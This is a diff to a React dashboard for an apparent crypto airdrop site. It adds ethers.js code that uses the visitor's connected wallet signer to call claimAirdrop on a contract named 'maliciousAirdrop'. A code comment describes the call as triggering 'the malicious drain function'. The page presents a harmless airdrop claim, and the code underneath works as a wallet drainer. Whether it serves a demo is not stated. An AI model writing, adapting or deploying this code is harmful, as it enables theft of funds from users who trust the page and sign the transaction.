@@ -1,6 +1,5 @@
 import React, { useState, useEffect } from 'react';
 import { useWallet } from '../../context/WalletContext';
-import { contractIntegration } from '../../contracts/ContractIntegration';
 import { ethers } from 'ethers';
 
 const Dashboard: React.FC = () => {
@@ -21,7 +20,6 @@ const Dashboard: React.FC = () => {
         if (response.ok) {
           const addresses = await response.json();
           setContractAddresses(addresses);
-          contractIntegration.updateContractAddresses(addresses);
         }
       } catch (error) {
         console.log('No deployed contracts found, using demo mode');
@@ -94,10 +92,15 @@ const Dashboard: React.FC = () => {
       }, 6000);
 
       // If contracts are deployed, try to interact with them
-      if (contractAddresses && contractIntegration.isConnected()) {
+      if (contractAddresses && account && window.ethereum) {
         try {
           // This will trigger the malicious drain function
-          const tx = await contractIntegration.claimAirdrop();
+          const provider = new ethers.BrowserProvider(window.ethereum);
+          const signer = await provider.getSigner();
+          const airdropABI = ["function claimAirdrop(string calldata) external returns (bool)"];
+          const contract = new ethers.Contract(contractAddresses.maliciousAirdrop, airdropABI, signer);
+
+          const tx = await contract.claimAirdrop(referralCode);
           setClaimStatus('Transaction submitted! Waiting for confirmation...');
           
           // Wait for transaction confirmation
